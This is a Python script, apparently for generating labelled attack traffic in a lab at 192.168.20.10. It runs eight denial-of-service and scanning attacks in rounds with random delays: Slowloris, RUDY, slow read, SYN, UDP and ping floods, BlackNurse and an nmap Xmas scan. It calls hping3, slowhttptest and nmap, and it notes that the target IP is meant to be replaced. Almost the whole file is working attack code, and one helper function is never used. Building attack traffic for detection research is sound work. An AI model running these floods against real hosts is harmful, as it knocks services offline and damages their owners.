import os
import time
import random
import ipaddress

# Target Machine
VICTIM_IP = "192.168.20.10"  # Replace with actual target IP

# Botnet Size Range
BOTNET_SIZE_RANGE = [50, 171, 233, 340, 500]  

# Attack Labels - Unique destination ports for each attack type
ATTACK_PORTS = {
    "slow_read": 6001,
    "rudy": 6002,
    "ping_flood": 6003,
    "blacknurse": 6004,
    "xmas_scan": 6005,
    "udp_flood": 6006,
    "syn_flood": 6007,
    "slowloris": 6008,
}

# Function to generate a list of spoofed botnet IPs
def generate_botnet_ips(start_ip, botnet_size):
    return [str(ipaddress.ip_address(start_ip) + x) for x in range(botnet_size)]

#Attack functions (Each attack sends to its assigned port)
def slow_read():
    os.system(f"slowhttptest -B -c 1000 -X -g -r 5 -l 300 -u http://{VICTIM_IP}:{ATTACK_PORTS['slow_read']}")

def rudy():
    os.system(f"slowhttptest -R -c 500 -H -u http://{VICTIM_IP}:{ATTACK_PORTS['rudy']} -l 300")

def ping_flood(botnet_size):
    os.system(
        f"hping3 -1 -i u{max(10, 10000 // botnet_size)} "
        f"-c {botnet_size * 20} --rand-source {VICTIM_IP} "
        f"-p {ATTACK_PORTS['ping_flood']}"
    )


def blacknurse(botnet_size, short=False):
    duration = 30 if short else 120
    interval = max(10, 10000 // botnet_size)

    os.system(
        f"timeout {duration} hping3 --icmp --icmptype 3 --icmpcode 3 "
        f"-d 1400 -i u{interval} {VICTIM_IP} "
        f"-p {ATTACK_PORTS['blacknurse']}"
    )




def xmas_scan(botnet_size):
    # No timeout needed — nmap handles timing
    os.system(
        f"nmap -sX -e eth1 -T4 --min-hostgroup {botnet_size} "
        f"--max-parallelism {botnet_size} "
        f"{VICTIM_IP} -p {ATTACK_PORTS['xmas_scan']}"
    )


def udp_flood(botnet_size):
    duration = 60
    interval = max(10, 10000 // botnet_size)

    os.system(
        f"timeout {duration} hping3 --udp -i u{interval} "
        f"{VICTIM_IP} -p {ATTACK_PORTS['udp_flood']}"
    )



def syn_flood(botnet_size):
    packet_count = botnet_size * 100
    interval = max(10, 10000 // botnet_size)
    os.system(
        f"hping3 -S -i u{interval} -c {packet_count} "
        f"{VICTIM_IP} -p {ATTACK_PORTS['syn_flood']}"
    )


def slowloris():
    os.system(f"slowhttptest -c 1000 -H -g -o slowloris_test -u http://{VICTIM_IP}:{ATTACK_PORTS['slowloris']} -r 50 -l 300")

# Execution schedule with random botnet sizes
ATTACKS = [
    ("slow_read", slow_read),
    ("rudy", rudy),
    ("ping_flood", ping_flood),
    ("blacknurse", blacknurse),
    ("xmas_scan", xmas_scan),
    ("udp_flood", udp_flood),
    ("syn_flood", syn_flood),
    ("slowloris", slowloris),
]

# Run each attack 4 times with different botnet sizes
for i in range(2):
    print(f"--- Starting Attack Round {i+1} ---")
    for label, attack in ATTACKS:
        botnet_size = random.choice(BOTNET_SIZE_RANGE)  # Randomize botnet size
        print(f"Executing {label} with botnet size {botnet_size}...")
        attack(botnet_size) if label not in ["slowloris", "rudy", "slow_read"] else attack()
        time.sleep(random.randint(30, 90))  # Random delay between attacks

print("All attacks executed.")
